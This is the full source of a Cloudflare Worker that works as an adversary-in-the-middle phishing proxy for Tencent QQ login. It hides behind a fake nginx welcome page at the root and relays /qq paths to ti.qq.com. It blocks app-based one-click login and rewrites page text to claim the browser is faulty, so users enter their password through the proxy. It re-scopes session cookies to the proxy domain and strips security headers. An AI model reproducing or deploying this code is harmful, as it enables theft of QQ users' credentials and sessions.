addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  thisProxyServerUrlHttps = `${url.protocol}//${url.hostname}/`;
  thisProxyServerUrl_hostOnly = url.host;
  event.respondWith(handleRequest(event.request));
});

const str = "/";
const lastVisitProxyCookie = "__PROXY_VISITEDSITE__";
const passwordCookieName = "__PROXY_PWD__";
const proxyHintCookieName = "__PROXY_HINT__";
const password = "";
const showPasswordPage = false;
const replaceUrlObj = "__location__yproxy__";

var thisProxyServerUrlHttps;
var thisProxyServerUrl_hostOnly;

const proxyHintInjection = ``; // 空提示，删除代理提示

const httpRequestInjection = `
//---***========================================***---information---***========================================***---
var nowURL = new URL(window.location.href);
var proxy_host = nowURL.host; //代理的host - proxy.com
var proxy_protocol = nowURL.protocol; //代理的protocol
var proxy_host_with_schema = proxy_protocol + "//" + proxy_host + "/"; //代理前缀 https://proxy.com/
var original_website_url_str = window.location.href.substring(proxy_host_with_schema.length); //被代理的【完整】地址 如：https://example.com/1?q#1
var original_website_url = new URL(original_website_url_str);

var original_website_host = original_website_url_str.substring(original_website_url_str.indexOf("://") + "://".length);
original_website_host = original_website_host.split('/')[0]; //被代理的Host proxied_website.com

var original_website_host_with_schema = original_website_url_str.substring(0, original_website_url_str.indexOf("://")) + "://" + original_website_host + "/"; //加上https的被代理的host， https://proxied_website.com/

//---***========================================***---通用func---***========================================***---
function changeURL(relativePath){
  if(relativePath == null) return null;

  relativePath_str = "";
  if (relativePath instanceof URL) {
    relativePath_str = relativePath.href;
  }else{
    relativePath_str = relativePath.toString();
  }

  try{
    if(relativePath_str.startsWith("data:") || relativePath_str.startsWith("mailto:") || relativePath_str.startsWith("javascript:") || relativePath_str.startsWith("chrome") || relativePath_str.startsWith("edge")) return relativePath_str;
  }catch{
    return relativePath_str;
  }

  // 特殊处理：不代理找回密码和新用户注册链接
  if (relativePath_str.includes("accounts.qq.com/psw/find") || 
      relativePath_str.includes("ssl.zc.qq.com/phone/index.html")) {
    return relativePath_str; // 直接返回原链接
  }
  
  // 特殊处理：跳过https://ui.ptlogin2.qq.com/cgi-bin/ssl/check
  if (relativePath_str.includes("ui.ptlogin2.qq.com/cgi-bin/ssl/check")) {
    return relativePath_str; // 直接返回原链接
  }

  // 防止QQ应用打开 - 拦截QQ协议
  if (relativePath_str.startsWith("mqqapi://") || 
      relativePath_str.startsWith("mqzone://") ||
      relativePath_str.includes("openmobile.qq.com")) {
    // 阻止打开QQ应用，但保持按钮功能
    console.log("阻止QQ应用打开:", relativePath_str);
    return "javascript:void(0);";
  }

  var pathAfterAdd = "";

  if(relativePath_str.startsWith("blob:")){
    pathAfterAdd = "blob:";
    relativePath_str = relativePath_str.substring("blob:".length);
  }

  try{
    if(relativePath_str.startsWith(proxy_host_with_schema)) relativePath_str = relativePath_str.substring(proxy_host_with_schema.length);
    if(relativePath_str.startsWith(proxy_host + "/")) relativePath_str = relativePath_str.substring(proxy_host.length + 1);
    if(relativePath_str.startsWith(proxy_host)) relativePath_str = relativePath_str.substring(proxy_host.length);
  }catch{
    //ignore
  }
  
  try {
    var absolutePath = new URL(relativePath_str, original_website_url_str).href; //获取绝对路径
    absolutePath = absolutePath.replaceAll(window.location.href, original_website_url_str);
    absolutePath = absolutePath.replaceAll(encodeURI(window.location.href), encodeURI(original_website_url_str));
    absolutePath = absolutePath.replaceAll(encodeURIComponent(window.location.href), encodeURIComponent(original_website_url_str));

    absolutePath = absolutePath.replaceAll(proxy_host, original_website_host);
    absolutePath = absolutePath.replaceAll(encodeURI(proxy_host), encodeURI(original_website_host));
    absolutePath = absolutePath.replaceAll(encodeURIComponent(proxy_host), encodeURIComponent(original_website_host));

    absolutePath = proxy_host_with_schema + absolutePath;
    absolutePath = pathAfterAdd + absolutePath;

    return absolutePath;
  } catch (e) {
    console.log("Exception occured: " + e.message + original_website_url_str + "   " + relativePath_str);
    return relativePath_str;
  }
}

// change from https://proxy.com/https://target_website.com/a to https://target_website.com/a
function getOriginalUrl(url){
  if(url == null) return null;
  if(url.startsWith(proxy_host_with_schema)) return url.substring(proxy_host_with_schema.length);
  return url;
}

//---***========================================***---注入网络---***========================================***---
function networkInject(){
  //inject network request
  var originalOpen = XMLHttpRequest.prototype.open;
  var originalFetch = window.fetch;
  XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
    url = changeURL(url);
    return originalOpen.apply(this, arguments);
  };

  window.fetch = function(input, init) {
    var url;
    if (typeof input === 'string') {
      url = input;
    } else if (input instanceof Request) {
      url = input.url;
    } else {
      url = input;
    }

    url = changeURL(url);

    console.log("R:" + url);
    if (typeof input === 'string') {
      return originalFetch(url, init);
    } else {
      const newRequest = new Request(url, input);
      return originalFetch(newRequest, init);
    }
  };
  
  console.log("NETWORK REQUEST METHOD INJECTED");
}

//---***========================================***---注入window.open---***========================================***---
function windowOpenInject(){
  const originalOpen = window.open;

  // Override window.open function
  window.open = function (url, name, specs) {
      let modifiedUrl = changeURL(url);
      return originalOpen.call(window, modifiedUrl, name, specs);
  };

  console.log("WINDOW OPEN INJECTED");
}

//---***========================================***---注入元素的src和href---***========================================***---
function elementPropertyInject(){
  const originalSetAttribute = HTMLElement.prototype.setAttribute;
  HTMLElement.prototype.setAttribute = function (name, value) {
      if (name == "src" || name == "href") {
        value = changeURL(value);
      }
      originalSetAttribute.call(this, name, value);
  };

  const originalGetAttribute = HTMLElement.prototype.getAttribute;
  HTMLElement.prototype.getAttribute = function (name) {
    const val = originalGetAttribute.call(this, name);
    if (name == "href" || name == "src") {
      return getOriginalUrl(val);
    }
    return val;
  };

  console.log("ELEMENT PROPERTY (get/set attribute) INJECTED");

  const setList = [
    [HTMLAnchorElement, "href"],
    [HTMLScriptElement, "src"],
    [HTMLImageElement, "src"],
    [HTMLLinkElement, "href"],
    [HTMLIFrameElement, "src"],
    [HTMLVideoElement, "src"],
    [HTMLAudioElement, "src"],
    [HTMLSourceElement, "src"],
    [HTMLObjectElement, "data"],
    [HTMLFormElement, "action"],
  ];
  
  for (const [whichElement, whichProperty] of setList) {
    if (!whichElement || !whichElement.prototype) continue;
    const descriptor = Object.getOwnPropertyDescriptor(whichElement.prototype, whichProperty);
    if (!descriptor) continue;
  
    Object.defineProperty(whichElement.prototype, whichProperty, {
      get: function () {
        const real = descriptor.get.call(this);
        return getOriginalUrl(real);
      },
      set: function (val) {
        descriptor.set.call(this, changeURL(val));
      },
      configurable: true,
    });
  
    console.log("Hooked " + whichElement.name + " " + whichProperty);
  }

  console.log("ELEMENT PROPERTY (src / href) INJECTED");
}

//---***========================================***---注入location---***========================================***---
class ProxyLocation {
  constructor(originalLocation) {
      this.originalLocation = originalLocation;
  }

  // 方法：重新加载页面
  reload(forcedReload) {
    this.originalLocation.reload(forcedReload);
  }

  // 方法：替换当前页面
  replace(url) {
    this.originalLocation.replace(changeURL(url));
  }

  // 方法：分配一个新的 URL
  assign(url) {
    this.originalLocation.assign(changeURL(url));
  }

  // 属性：获取和设置 href
  get href() {
    return original_website_url_str;
  }

  set href(url) {
    this.originalLocation.href = changeURL(url);
  }

  // 属性：获取和设置 protocol
  get protocol() {
    return original_website_url.protocol;
  }

  set protocol(value) {
    original_website_url.protocol = value;
    this.originalLocation.href = proxy_host_with_schema + original_website_url.href;
  }

  // 属性：获取和设置 host
  get host() {
    return original_website_url.host;
  }

  set host(value) {
    original_website_url.host = value;
    this.originalLocation.href = proxy_host_with_schema + original_website_url.href;
  }

  // 属性：获取和设置 hostname
  get hostname() {
    return original_website_url.hostname;
  }

  set hostname(value) {
    original_website_url.hostname = value;
    this.originalLocation.href = proxy_host_with_schema + original_website_url.href;
  }

  // 属性：获取和设置 port
  get port() {
    return original_website_url.port;
  }

  set port(value) {
    original_website_url.port = value;
    this.originalLocation.href = proxy_host_with_schema + original_website_url.href;
  }

  // 属性：获取和设置 pathname
  get pathname() {
    return original_website_url.pathname;
  }

  set pathname(value) {
    original_website_url.pathname = value;
    this.originalLocation.href = proxy_host_with_schema + original_website_url.href;
  }

  // 属性：获取和设置 search
  get search() {
    return original_website_url.search;
  }

  set search(value) {
    original_website_url.search = value;
    this.originalLocation.href = proxy_host_with_schema + original_website_url.href;
  }

  // 属性：获取和设置 hash
  get hash() {
    return original_website_url.hash;
  }

  set hash(value) {
    original_website_url.hash = value;
    this.originalLocation.href = proxy_host_with_schema + original_website_url.href;
  }

  // 属性：获取 origin
  get origin() {
    return original_website_url.origin;
  }

  toString() {
    return this.originalLocation.href;
  }
}

function documentLocationInject(){
  Object.defineProperty(document, 'URL', {
    get: function () {
        return original_website_url_str;
    },
    set: function (url) {
        document.URL = changeURL(url);
    }
  });

  Object.defineProperty(document, '${replaceUrlObj}', {
      get: function () {
          return new ProxyLocation(window.location);
      },  
      set: function (url) {
          window.location.href = changeURL(url);
      }
  });
  console.log("LOCATION INJECTED");
}

function windowLocationInject() {
  Object.defineProperty(window, '${replaceUrlObj}', {
      get: function () {
          return new ProxyLocation(window.location);
      },
      set: function (url) {
          window.location.href = changeURL(url);
      }
  });

  console.log("WINDOW LOCATION INJECTED");
}

//---***========================================***---注入历史---***========================================***---
function historyInject(){
  const originalPushState = History.prototype.pushState;
  const originalReplaceState = History.prototype.replaceState;

  History.prototype.pushState = function (state, title, url) {
    if(!url) return; //x.com 会有一次undefined
    
    if(url.startsWith("/" + original_website_url.href)) url = url.substring(("/" + original_website_url.href).length);
    if(url.startsWith("/" + original_website_url.href.substring(0, original_website_url.href.length - 1))) url = url.substring(("/" + original_website_url.href).length - 1);
    
    var u = changeURL(url);
    return originalPushState.apply(this, [state, title, u]);
  };

  History.prototype.replaceState = function (state, title, url) {
    if(!url) return; //x.com 会有一次undefined

    let url_str = url.toString();

    if(url_str.startsWith("/" + original_website_url.href)) url_str = url_str.substring(("/" + original_website_url.href).length);
    if(url_str.startsWith("/" + original_website_url.href.substring(0, original_website_url.href.length - 1))) url_str = url_str.substring(("/" + original_website_url.href).length - 1);

    if(url_str.startsWith("/" + original_website_url.href.replace("://", ":/"))) url_str = url_str.substring(("/" + original_website_url.href.replace("://", ":/")).length);
    if(url_str.startsWith("/" + original_website_url.href.substring(0, original_website_url.href.length - 1).replace("://", ":/"))) url_str = url_str.substring(("/" + original_website_url.href).replace("://", ":/").length - 1);

    var u = changeURL(url_str);
    return originalReplaceState.apply(this, [state, title, u]);
  };

  console.log("HISTORY INJECTED");
}

//---***========================================***---操作---***========================================***---
networkInject();
windowOpenInject();
elementPropertyInject();
documentLocationInject();
windowLocationInject();
historyInject();

//---***========================================***---在window.load之后的操作---***========================================***---
window.addEventListener('load', () => {
  // 修改文本：将"请安装最新版本的QQ手机版"改为"你的浏览器异常，请尝试使用账号密码登录"
  var elements = document.querySelectorAll('*');
  elements.forEach(function(el) {
    if (el.textContent && el.textContent.includes('请安装最新版本的QQ手机版')) {
      el.textContent = el.textContent.replace('请安装最新版本的QQ手机版', '你的浏览器异常，请尝试使用账号密码登录');
    }
    if (el.textContent && el.textContent.includes('使用一键登录')) {
      el.textContent = el.textContent.replace('使用一键登录', '你的浏览器异常，请尝试使用账号密码登录');
    }
  });
  
  // 阻止QQ应用打开的点击事件
  document.addEventListener('click', function(e) {
    var target = e.target;
    while (target && target !== document) {
      if (target.tagName === 'A' && target.href) {
        if (target.href.includes('mqqapi://') || 
            target.href.includes('mqzone://') ||
            target.href.includes('openmobile.qq.com')) {
          e.preventDefault();
          e.stopPropagation();
          console.log("阻止了QQ应用打开");
          return false;
        }
      }
      target = target.parentNode;
    }
  }, true);
});

//---***========================================***---在window.error的时候---***========================================***---
window.addEventListener('error', event => {
  var element = event.target || event.srcElement;
  if (element.tagName === 'SCRIPT') {
    console.log("Found problematic script:", element);
    if(element.alreadyChanged){
      console.log("this script has already been injected, ignoring this problematic script...");
      return;
    }
    
    // 创建新的 script 元素
    var newScript = document.createElement("script");
    newScript.src = element.src;
    newScript.async = element.async;
    newScript.defer = element.defer;
    newScript.alreadyChanged = true;

    // 添加新的 script 元素到 document
    document.head.appendChild(newScript);

    console.log("New script added:", newScript);
  }
}, true);
console.log("WINDOW CORS ERROR EVENT ADDED");
`;

const htmlCovPathInjectFuncName = "parseAndInsertDoc";
const htmlCovPathInject = `
function ${htmlCovPathInjectFuncName}(htmlString) {
  // First, modify the HTML string to update all URLs and remove integrity
  const parser = new DOMParser();
  const tempDoc = parser.parseFromString(htmlString, 'text/html');
  
  // Process all elements in the temporary document
  const allElements = tempDoc.querySelectorAll('*');

  allElements.forEach(element => {
    // 修改文本内容
    if (element.textContent && element.textContent.includes('请安装最新版本的QQ手机版')) {
      element.textContent = element.textContent.replace('请安装最新版本的QQ手机版', '你的浏览器异常，请尝试使用账号密码登录');
    }
    if (element.textContent && element.textContent.includes('使用一键登录')) {
      element.textContent = element.textContent.replace('使用一键登录', '你的浏览器异常，请尝试使用账号密码登录');
    }
    
    // 处理链接
    if (element.hasAttribute('href')) {
      var href = element.getAttribute('href');
      var newHref = changeURL(href);
      element.setAttribute('href', newHref);
    }
    
    if (element.hasAttribute('src')) {
      var src = element.getAttribute('src');
      var newSrc = changeURL(src);
      element.setAttribute('src', newSrc);
    }
    
    if (element.tagName === 'FORM' && element.hasAttribute('action')) {
      var action = element.getAttribute('action');
      var newAction = changeURL(action);
      element.setAttribute('action', newAction);
    }
    
    if (element.hasAttribute('integrity')) {
      element.removeAttribute('integrity');
    }
  });

  // Get the modified HTML string
  const modifiedHtml = tempDoc.documentElement.outerHTML;
  
  // Now use document.open/write/close to replace the entire document
  document.open();
  document.write('<!DOCTYPE html>' + modifiedHtml);
  document.close();
}

function replaceContentPaths(content){
  // 替换CSS和JS中的链接
  let regex = new RegExp(\`(?<!src="|href=")(https?:\\\\/\\\\/[^\s'"]+)\`, 'g');

  content = content.replaceAll(regex, (match) => {
    if (match.startsWith("http")) {
      return proxy_host_with_schema + match;
    } else {
      return proxy_host + "/" + match;
    }
  });

  return content;
}
`;

// nginx欢迎页面
const nginxWelcomePage = `<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
body {
width: 35em;
margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif;
}
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and working. Further configuration is required.</p>
<p>For online documentation and support please refer to <a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at <a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"23706d89f379497d9a10994cbea3fda0","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
</html>`;

const pwdPage = `
<!DOCTYPE html>
<html>
    <head>
        <script>
            function setPassword() {
                try {
                    var cookieDomain = window.location.hostname;
                    var password = document.getElementById('password').value;
                    var currentOrigin = window.location.origin;
                    var oneWeekLater = new Date();
                    oneWeekLater.setTime(oneWeekLater.getTime() + (7 * 24 * 60 * 60 * 1000)); // 一周的毫秒数
                    document.cookie = "${passwordCookieName}" + "=" + password + "; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + cookieDomain;
                    document.cookie = "${passwordCookieName}" + "=" + password + "; expires=" + oneWeekLater.toUTCString() + "; path=/; domain=" + cookieDomain;
                } catch(e) {
                    alert(e.message);
                }
                location.reload();
            }
        </script>
    </head>
    <body>
        <div>
            <input id="password" type="password" placeholder="Password">
            <button onclick="setPassword()">
                Submit
            </button>
        </div>
    </body>
</html>
`;

const redirectError = `
<html><head></head><body><h2>Error while redirecting: the website you want to access to may contain wrong redirect information, and we can not parse the info</h2></body></html>
`;

async function handleRequest(request) {
  const userAgent = request.headers.get('User-Agent');
  if (userAgent && userAgent.includes("Bytespider")) {
    return new Response("好不要脸，爬Wikipedia还要用我代理爬，说的就是你们Bytespider。", {
      headers: { "Content-Type": "text/plain" }
    });
  }

  // 判断密码
  var siteCookie = request.headers.get('Cookie');
  if (password != "") {
    if (siteCookie != null && siteCookie != "") {
      var pwd = getCook(passwordCookieName, siteCookie);
      if (pwd != null && pwd != "") {
        if (pwd != password) {
          return handleWrongPwd();
        }
      } else {
        return handleWrongPwd();
      }
    } else {
      return handleWrongPwd();
    }
  }

  // 处理前置情况
  const url = new URL(request.url);
  if (request.url.endsWith("favicon.ico")) {
    return Response.redirect("https://ti.qq.com/favicon.ico", 301);
  }
  if (request.url.endsWith("robots.txt")) {
    return new Response(`User-Agent: *
Disallow: /`, {
      headers: { "Content-Type": "text/plain" },
    });
  }

  var actualUrlStr = url.pathname.substring(url.pathname.indexOf(str) + str.length) + url.search + url.hash;
  
  // 如果访问根路径，返回nginx欢迎页面
  if (actualUrlStr == "" || url.pathname === "/") {
    return new Response(nginxWelcomePage, {
      headers: { "Content-Type": "text/html; charset=utf-8" }
    });
  }

  // 处理/qqlogin路径，代理到ti.qq.com
  if (url.pathname.startsWith("/qq") || url.pathname.startsWith("/qqlogin")) {
    // 代理到ti.qq.com/qqlevel/index
    actualUrlStr = "https://ti.qq.com/qqlevel/index" + url.search + url.hash;
  } else {
    // 其他路径返回404
    return new Response("Not Found", { status: 404 });
  }

  try {
    var test = actualUrlStr;
    if (!test.startsWith("http")) {
      test = "https://" + test;
    }
    var u = new URL(test);
  } catch {
    var lastVisit;
    if (siteCookie != null && siteCookie != "") {
      lastVisit = getCook(lastVisitProxyCookie, siteCookie);
      if (lastVisit != null && lastVisit != "") {
        return Response.redirect(thisProxyServerUrlHttps + lastVisit + "/" + actualUrlStr, 301);
      }
    }
    return new Response("Something is wrong while trying to get your cookie", { status: 400 });
  }

  if (!actualUrlStr.startsWith("http") && !actualUrlStr.includes("://")) {
    return Response.redirect(thisProxyServerUrlHttps + "https://" + actualUrlStr, 301);
  }

  const actualUrl = new URL(actualUrlStr);

  // 特殊处理：跳过https://ui.ptlogin2.qq.com/cgi-bin/ssl/check
  if (actualUrlStr.includes("ui.ptlogin2.qq.com/cgi-bin/ssl/check")) {
    // 直接返回原链接，不代理
    return fetch(actualUrl, request);
  }

  // 处理客户端发来的 Header
  let clientHeaderWithChange = new Headers();
  request.headers.forEach((value, key) => {
    var newValue = value.replaceAll(thisProxyServerUrlHttps + "http", "http");
    newValue = newValue.replaceAll(thisProxyServerUrlHttps, `${actualUrl.protocol}//${actualUrl.hostname}/`);
    newValue = newValue.replaceAll(thisProxyServerUrlHttps.substring(0, thisProxyServerUrlHttps.length - 1), `${actualUrl.protocol}//${actualUrl.hostname}`);
    newValue = newValue.replaceAll(thisProxyServerUrl_hostOnly, actualUrl.host);
    clientHeaderWithChange.set(key, newValue);
  });

  // 处理客户端发来的 Body
  let clientRequestBodyWithChange;
  if (request.body) {
    const [body1, body2] = request.body.tee();
    try {
      const bodyText = await new Response(body1).text();
      if (bodyText.includes(thisProxyServerUrlHttps) || bodyText.includes(thisProxyServerUrl_hostOnly)) {
        clientRequestBodyWithChange = bodyText
          .replaceAll(thisProxyServerUrlHttps, actualUrlStr)
          .replaceAll(thisProxyServerUrl_hostOnly, actualUrl.host);
      } else {
        clientRequestBodyWithChange = body2;
      }
    } catch (e) {
      clientRequestBodyWithChange = body2;
    }
  }

  // 构造代理请求
  const modifiedRequest = new Request(actualUrl, {
    headers: clientHeaderWithChange,
    method: request.method,
    body: (request.body) ? clientRequestBodyWithChange : request.body,
    redirect: "manual"
  });

  // Fetch结果
  const response = await fetch(modifiedRequest);
  if (response.status.toString().startsWith("3") && response.headers.get("Location") != null) {
    try {
      return Response.redirect(thisProxyServerUrlHttps + new URL(response.headers.get("Location"), actualUrlStr).href, 301);
    } catch {
      return new Response(redirectError + "<br>the redirect url:" + response.headers.get("Location") + ";the url you are now at:" + actualUrlStr, { status: 500 });
    }
  }

  // 处理获取的结果
  var modifiedResponse;
  var bd;
  var hasProxyHintCook = (getCook(proxyHintCookieName, siteCookie) != "");
  const contentType = response.headers.get("Content-Type");

  var isHTML = false;

  if (response.body) {
    if (contentType && contentType.startsWith("text/")) {
      bd = await response.text();
      isHTML = (contentType && contentType.includes("text/html") && bd.includes("<html"));

      if (contentType && (contentType.includes("html") || contentType.includes("javascript"))) {
        bd = bd.replaceAll("window.location", "window." + replaceUrlObj);
        bd = bd.replaceAll("document.location", "document." + replaceUrlObj);
      }

      if (isHTML) {
        // 修改文本内容
        bd = bd.replace(/请安装最新版本的QQ手机版/g, '你的浏览器异常，请尝试使用账号密码登录');
        bd = bd.replace(/使用一键登录/g, '你的浏览器异常，请尝试使用账号密码登录');
        
        var hasBom = false;
        if (bd.charCodeAt(0) === 0xFEFF) {
          bd = bd.substring(1);
          hasBom = true;
        }

        var inject = `
        <!DOCTYPE html>
        <script>
        // the proxy hint must be written as a single IIFE, or it will show error in example.com   idk what's wrong
        (function () {
          // proxy hint
          ${((!hasProxyHintCook) ? proxyHintInjection : "")}
        })();

        (function () {
          // hooks stuff - Must before convert path functions
          // it defines all necessary variables
          ${httpRequestInjection}

          // Convert path functions
          ${htmlCovPathInject}

          // Invoke the function
          const originalBodyBase64Encoded = "${new TextEncoder().encode(bd)}";
          const bytes = new Uint8Array(originalBodyBase64Encoded.split(',').map(Number));
          
          ${htmlCovPathInjectFuncName}(new TextDecoder().decode(bytes));
        })();
        </script>
        `;

        bd = (hasBom ? "\uFEFF" : "") + inject;
      } else {
        // 非HTML内容，替换链接
        let regex = new RegExp(`(?<!src="|href=")(https?:\\/\\/[^\s'"]+)`, 'g');
        bd = bd.replaceAll(regex, (match) => {
          if (match.startsWith("http")) {
            return thisProxyServerUrlHttps + match;
          } else {
            return thisProxyServerUrl_hostOnly + "/" + match;
          }
        });
      }

      modifiedResponse = new Response(bd, response);
    } else {
      modifiedResponse = new Response(response.body, response);
    }
  } else {
    modifiedResponse = new Response(response.body, response);
  }

  // 处理要返回的 Cookie Header
  let headers = modifiedResponse.headers;
  let cookieHeaders = [];

  for (let [key, value] of headers.entries()) {
    if (key.toLowerCase() == 'set-cookie') {
      cookieHeaders.push({ headerName: key, headerValue: value });
    }
  }

  if (cookieHeaders.length > 0) {
    cookieHeaders.forEach(cookieHeader => {
      let cookies = cookieHeader.headerValue.split(',').map(cookie => cookie.trim());

      for (let i = 0; i < cookies.length; i++) {
        let parts = cookies[i].split(';').map(part => part.trim());

        let pathIndex = parts.findIndex(part => part.toLowerCase().startsWith('path='));
        let originalPath;
        if (pathIndex !== -1) {
          originalPath = parts[pathIndex].substring("path=".length);
        }
        let absolutePath = "/" + new URL(originalPath, actualUrlStr).href;

        if (pathIndex !== -1) {
          parts[pathIndex] = `Path=${absolutePath}`;
        } else {
          parts.push(`Path=${absolutePath}`);
        }

        let domainIndex = parts.findIndex(part => part.toLowerCase().startsWith('domain='));

        if (domainIndex !== -1) {
          parts[domainIndex] = `domain=${thisProxyServerUrl_hostOnly}`;
        } else {
          parts.push(`domain=${thisProxyServerUrl_hostOnly}`);
        }

        cookies[i] = parts.join('; ');
      }

      headers.set(cookieHeader.headerName, cookies.join(', '));
    });
  }

  if (isHTML && response.status == 200) {
    let cookieValue = lastVisitProxyCookie + "=" + actualUrl.origin + "; Path=/; Domain=" + thisProxyServerUrl_hostOnly;
    headers.append("Set-Cookie", cookieValue);

    if (response.body && !hasProxyHintCook) {
      const expiryDate = new Date();
      expiryDate.setTime(expiryDate.getTime() + 24 * 60 * 60 * 1000);
      var hintCookie = `${proxyHintCookieName}=1; expires=${expiryDate.toUTCString()}; path=/`;
      headers.append("Set-Cookie", hintCookie);
    }
  }

  // 删除部分限制性的 Header
  modifiedResponse.headers.set('Access-Control-Allow-Origin', '*');
  modifiedResponse.headers.set("X-Frame-Options", "ALLOWALL");

  var listHeaderDel = ["Content-Security-Policy", "Permissions-Policy", "Cross-Origin-Embedder-Policy", "Cross-Origin-Resource-Policy"];
  listHeaderDel.forEach(element => {
    modifiedResponse.headers.delete(element);
    modifiedResponse.headers.delete(element + "-Report-Only");
  });

  if (!hasProxyHintCook) {
    modifiedResponse.headers.set("Cache-Control", "max-age=0");
  }

  return modifiedResponse;
}

function getCook(cookiename, cookies) {
  var cookiestring = RegExp(cookiename + "=[^;]+").exec(cookies);
  return decodeURIComponent(!!cookiestring ? cookiestring.toString().replace(/^[^=]+./, "") : "");
}

const matchList = [[/href=("|')([^"']*)("|')/g, `href="`], [/src=("|')([^"']*)("|')/g, `src="`]];
function covToAbs_ServerSide(body, requestPathNow) {
  var original = [];
  var target = [];

  for (var match of matchList) {
    var setAttr = body.matchAll(match[0]);
    if (setAttr != null) {
      for (var replace of setAttr) {
        if (replace.length == 0) continue;
        var strReplace = replace[0];
        if (!strReplace.includes(thisProxyServerUrl_hostOnly)) {
          if (!isPosEmbed(body, replace.index)) {
            var relativePath = strReplace.substring(match[1].toString().length, strReplace.length - 1);
            if (!relativePath.startsWith("data:") && !relativePath.startsWith("mailto:") && !relativePath.startsWith("javascript:") && !relativePath.startsWith("chrome") && !relativePath.startsWith("edge")) {
              try {
                var absolutePath = thisProxyServerUrlHttps + new URL(relativePath, requestPathNow).href;
                original.push(strReplace);
                target.push(match[1].toString() + absolutePath + `"`);
              } catch {
                // 无视
              }
            }
          }
        }
      }
    }
  }
  for (var i = 0; i < original.length; i++) {
    body = body.replaceAll(original[i], target[i]);
  }
  return body;
}

function isPosEmbed(html, pos) {
  if (pos > html.length || pos < 0) return false;
  let start = html.lastIndexOf('<', pos);
  if (start === -1) start = 0;

  let end = html.indexOf('>', pos);
  if (end === -1) end = html.length;

  let content = html.slice(start + 1, end);
  if (content.includes(">") || content.includes("<")) {
    return true;
  }
  return false;
}

function handleWrongPwd() {
  if (showPasswordPage) {
    return new Response(pwdPage, {
      headers: { "Content-Type": "text/html; charset=utf-8" }
    });
  } else {
    return new Response("<h1>403 Forbidden</h1><br>You do not have access to view this webpage.", { status: 403 });
  }
}

function nthIndex(str, pat, n) {
  var L = str.length, i = -1;
  while (n-- && i++ < L) {
    i = str.indexOf(pat, i);
    if (i < 0) break;
  }
  return i;
}